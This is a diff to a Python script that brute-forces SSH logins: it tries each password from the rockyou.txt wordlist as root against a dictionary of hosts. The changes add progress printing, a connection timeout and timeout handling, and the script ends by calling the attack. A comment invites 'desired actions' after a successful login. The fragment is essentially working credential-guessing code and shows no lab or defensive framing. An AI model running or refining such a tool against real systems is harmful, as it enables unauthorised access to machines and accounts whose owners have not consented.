@@ -257,7 +257,8 @@ def ssh_login(ip_dict, password_file):
 
         for pw in passwords:
             try:
-                client.connect(ip, username='root', password=pw)
+                print(f"{GREEN}Trying {RESET}{pw} {GREEN} as a password{RESET}")
+                client.connect(ip, username='root', password=pw, timeout=15)
                 print(f"{GREEN}Successful login on {RESET}{ip}{GREEN} with password:{RESET} {pw}")
                 # Add your desired actions here after successful login
                 client.close()
@@ -268,5 +269,9 @@ def ssh_login(ip_dict, password_file):
             except paramiko.SSHException:
                 print(f"{RED}Failed to connect to{RESET} {ip}")
                 break
+            except socket.timeout:
+                print(f"{RED}Connection timed out for {RESET}{ip}")
+                break
+
 
 ssh_login(host_dict,'rockyou.txt')
